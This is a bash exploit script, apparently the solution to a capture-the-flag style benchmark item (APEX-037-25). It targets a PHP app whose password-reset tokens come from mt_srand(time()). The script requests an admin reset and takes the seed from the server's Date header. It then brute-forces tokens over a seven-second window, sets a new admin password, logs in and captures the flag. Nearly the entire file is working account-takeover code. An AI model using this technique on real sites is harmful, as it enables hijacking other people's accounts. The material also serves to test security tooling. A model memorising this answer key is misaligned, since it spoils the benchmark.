#!/usr/bin/env bash
# APEX-037-25 — "Predictable Token Generation (Weak PRNG)" (tags: cryptography, prng)
#
# `generateResetToken` calls `mt_srand(time())` and then draws 32 letters. The
# token is therefore a pure function of the second the request arrived, and the
# whole keyspace is the handful of seconds around it. Nothing is intercepted
# here; the token is recomputed.
#
# The prediction needs PHP's Mersenne Twister, which is why `php_mt_rand.py`
# sits beside this script rather than being faked with `$RANDOM`. h5i's part is
# the requests either side: ask for the reset, then try each candidate token
# until the application accepts one.
#
# The `Date` header is the oracle for the seed — the server's own clock, to the
# second, on the response to the request that generated the token.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
. "$(dirname "$0")/lib.sh"
SESSION="apex037-$$"
NEW_PASSWORD="predicted$$Pass"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

"$H5I" browser open "$URL/forgot.php" --session "$SESSION" --new --capture >/dev/null
send "$SESSION" req_0 --create \
    --set method=POST --set path=/forgot.php \
    --set header.Content-Type=application/x-www-form-urlencoded \
    --set form.email=admin@securecorp.local > /tmp/apex037-$$.http
AT="$(python3 -c '
import email.utils, re, sys
head = open(sys.argv[1]).read()
found = re.search(r"(?im)^date:\s*(.+)$", head)
print(int(email.utils.parsedate_to_datetime(found.group(1)).timestamp()))
' "/tmp/apex037-$$.http")"
rm -f "/tmp/apex037-$$.http"

# `reset.php` reads the token from the body as readily as from the query, so
# the candidates go in as a form field. A successful reset redirects to the
# login page and says so; anything else leaves the form on screen.
for SEED in $(seq $((AT - 3)) $((AT + 3))); do
    TOKEN="$(python3 "$(dirname "$0")/php_mt_rand.py" "$SEED")"
    send "$SESSION" req_0 --create \
        --set method=POST --set path=/reset.php \
        --set header.Content-Type=application/x-www-form-urlencoded \
        --set "form.token=$TOKEN" \
        --set "form.password=$NEW_PASSWORD" \
        --set "form.confirm_password=$NEW_PASSWORD" > "/tmp/apex037-$$.http"
    grep -qi "reset successfully" "/tmp/apex037-$$.http" && break
done
rm -f "/tmp/apex037-$$.http"

send "$SESSION" req_0 --create \
    --set method=POST --set path=/login.php \
    --set header.Content-Type=application/x-www-form-urlencoded \
    --set form.email=admin@securecorp.local \
    --set "form.password=$NEW_PASSWORD" >/dev/null
send "$SESSION" req_0 --create --set path=/profile.php | flag
